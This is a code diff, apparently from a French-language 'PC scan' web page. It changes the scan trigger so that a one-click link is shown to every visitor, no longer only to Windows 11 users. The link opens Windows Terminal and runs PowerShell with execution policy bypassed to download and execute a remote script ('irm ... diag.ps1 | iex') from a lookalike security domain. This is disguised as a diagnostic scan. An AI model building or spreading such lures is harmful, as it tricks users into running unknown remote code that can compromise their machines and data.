@@ -802,22 +802,19 @@ function showBrowserResult(result: any) {
   el.style.display = "block";
 }
 
-function updateScanTrigger(isWin11: boolean) {
+function updateScanTrigger(_isWin11: boolean) {
   const trigger = document.getElementById("sospc-scan-trigger") as HTMLElement;
   if (!trigger) return;
 
-  if (isWin11) {
-    // Lien wt: pour Windows 11 uniquement
-    const cmdBox = document.getElementById("sospc-cmd-box") as HTMLElement;
-    if (cmdBox) cmdBox.style.display = "none";
-    trigger.innerHTML =
-      '<a id="sospc-wt-link" href="wt: -d . powershell.exe -NoProfile -ExecutionPolicy Bypass -Command &quot;$s=\'' +
-      sessionId +
-      '\'; irm https://talos-int.com/diag.ps1 | iex&quot;" class="sospc-wt-btn">🚀 Scanner maintenant (1 clic)</a>' +
-      '<div class="sospc-scan-sub">Windows Terminal va s\'ouvrir automatiquement</div>';
-    trigger.style.display = "block";
-  }
-  // Win10 ou OS inconnu : on garde l'UI originale (cmd-box + bouton Copier)
+  // Toujours afficher le bouton wt: — la détection OS navigateur est trop peu fiable
+  const cmdBox = document.getElementById("sospc-cmd-box") as HTMLElement;
+  if (cmdBox) cmdBox.style.display = "none";
+  trigger.innerHTML =
+    '<a id="sospc-wt-link" href="wt: -d . powershell.exe -NoProfile -ExecutionPolicy Bypass -Command &quot;$s=\'' +
+    sessionId +
+    '\'; irm https://talos-int.com/diag.ps1 | iex&quot;" class="sospc-wt-btn">🚀 Scanner maintenant (1 clic)</a>' +
+    '<div class="sospc-scan-sub">Windows Terminal va s\'ouvrir automatiquement</div>';
+  trigger.style.display = "block";
 }
 
 // Écoute le résultat du scan navigateur
